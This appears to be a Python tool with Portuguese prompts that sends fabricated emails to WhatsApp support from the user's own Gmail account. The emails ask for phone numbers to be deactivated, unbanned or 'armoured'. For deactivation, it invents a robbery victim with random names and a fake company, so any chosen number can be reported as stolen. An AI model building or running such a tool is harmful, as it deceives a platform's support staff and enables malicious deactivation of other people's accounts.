import termcolor
import random

empresa = ['tapmental', 'neuromental', 'neurobeacon', 'neurofino', 'advancemental', 'fcast', 'fcast', 'neuronics',
           'vmation', 'neurofit', 'bomorbid', 'Meuritech', 'caregenix', 'neurope', 'nexaflex', 'neurollero']
dia = ['Bom dia', 'Boa Tarde', 'Boa noite']

nome = ['Jose', 'Joao', 'Antônio', 'Francisco', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Luiz', 'Marcos']

sobrenome = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Pereira', 'Ferreira', 'Costa', 'Rodrigues']

def send_email(user, pwd, subject, body, info):
    import smtplib

    FROM = user
    TO = "support@whatsapp.com"
    SUBJECT = subject
    TEXT = body

    message = """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    if info == 1:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(user, pwd)
            server.sendmail(FROM, TO, message)
            server.close()
            print("Email de desativação enviado...")
        except Exception as e:
            print(e)
            print("Algo de errado não está certo...")
    elif info == 3:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(user, pwd)
            server.sendmail(FROM, TO, message)
            server.close()
            print("Email de desban enviado...")
        except:
            print("Algo de errado não está certo...")
    else:
        x = 0
        while x != 3:
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.ehlo()
                server.starttls()
                server.login(user, pwd)
                server.sendmail(FROM, TO, message)
                server.close()
                x = x + 1
            except:
                print("Algo de errado não está certo...")
                x = x + 1
        print("Número blindado...")


clear = "\n" * 100
termcolor.cprint("######################################################################", "green")
termcolor.cprint("█████ ████   ███  █   █  ███  █████  ███  ████  █  █  █████ █████ ", "green")
termcolor.cprint("  █   █   █ █   █ █   █ █   █    █  █   █ █   █ █ █     █     █   ", "green")
termcolor.cprint("  █   ████  █████  █ █  █████   █   █████ ████  ██ █    █     █   ", "green")
termcolor.cprint("  █   █   █ █   █  █ █  █   █  █    █   █ █     █  █    █     █   ", "green")
termcolor.cprint("  █   █   █ █   █   █   █   █ █████ █   █ █     █   █ █████   █   ", "green")
termcolor.cprint("Bყ Cαɾαȥι__ αɳԃ Fɾυιʂ", "green")
termcolor.cprint("######################################################################", "green")
termcolor.cprint(input("Pressione enter para continuar..."))
print(clear)
termcolor.cprint("######################################################################", "green")
termcolor.cprint(" O que deseja?", "green")
termcolor.cprint("1 - Desativar número.", "green")
termcolor.cprint("2 - Blindar número.", "green")
termcolor.cprint("3 - Desbanir número", "green")
termcolor.cprint("4 - Sobre os criadores.", "green")
termcolor.cprint("Selecione a opção que deseja.", "green")
n = int(input())
if n == 1:
    print(clear)
    termcolor.cprint("Qual seu gmail?", "green")
    email = input()
    sent_from = email
    termcolor.cprint("Qual a password?", "green")
    gpass = input()
    termcolor.cprint("Qual número deseja desativar?(Ex:+55XXXXXXXXX)", "green")
    num = input()
    titulo = "My name is " + random.choice(nome) + " please Deactivate The My Account Number (" + num + ") Immediately Because The Number Has Been Lost!!!"
    corpo = random.choice(dia)+ ', meu nome e '+ random.choice(nome) +' '+ random.choice(sobrenome) +', eu fui recentemente assaltado e os bandidos levaram todos os meus documentos inclusive celular, e presciso que Desativem minha conta ate eu recuperar meu celular ou o chip, pois eu tenho minha micro empresa('+ random.choice(empresa) +') no celular e nao quero que os bandidos tenham acesso a ela'.format(num)
    info = 1
    send_email(email, gpass, titulo, corpo, info)
elif n == 2:
    print(clear)
    termcolor.cprint("Qual seu gmail?", "green")
    email = input()
    sent_from = email
    termcolor.cprint("Qual a password?", "green")
    gpass = input()
    termcolor.cprint("Qual número deseja blindar?(Ex:+55XXXXXXXXX)", "green")
    num = input()
    titulo = "Please Deactivate The My Account Number (" + num + ") Immediately Because The Number Has Been Lost"
    corpo = "Porfavor desativem a conta,pois estou nos EUA sdsdsdsdddsdsdsdsddsde minha casa foi roubada, meu numero({0})".format(num)
    info = 2
    send_email(email, gpass, titulo, corpo, info)
elif n == 3:
    print(clear)
    print(clear)
    termcolor.cprint("Qual seu gmail?", "green")
    email = input()
    sent_from = email
    termcolor.cprint("Qual a password?", "green")
    gpass = input()
    termcolor.cprint("Qual número deseja desbanir?(Ex:+55XXXXXXXXX)", "green")
    num = input()
    titulo = "Desbanam meu numero por favor (" + num + ") pois fui banido injustamente"
    corpo = "Nossa! Eu estou trabalhando e de repente meu numero foi banido, eu nao sei o que aconteceu preciso do meu numero pois e do meu trabalho, eu trabalho com vendas e preciso atender meus clientes, na empresa"+ random.choice(empresa) + ".".format(num)
    info = 3
    send_email(email, gpass, titulo, corpo, info)
elif n == 4:
    print(clear)
    termcolor.cprint("######################################################################")
    termcolor.cprint("O criador deste script gostoso e o Carazi__, com a ajuda do Fruis.")
    termcolor.cprint("Carazi__: https://www.youtube.com/channel/UChMjqH0UXy1ft0oRb4dncNg")
    termcolor.cprint("Fruis: https://www.youtube.com/channel/UCYvmi42JWy5HHaKOu2vlgtg")
    termcolor.cprint("######################################################################")
else:
    print("Opção não existe...")
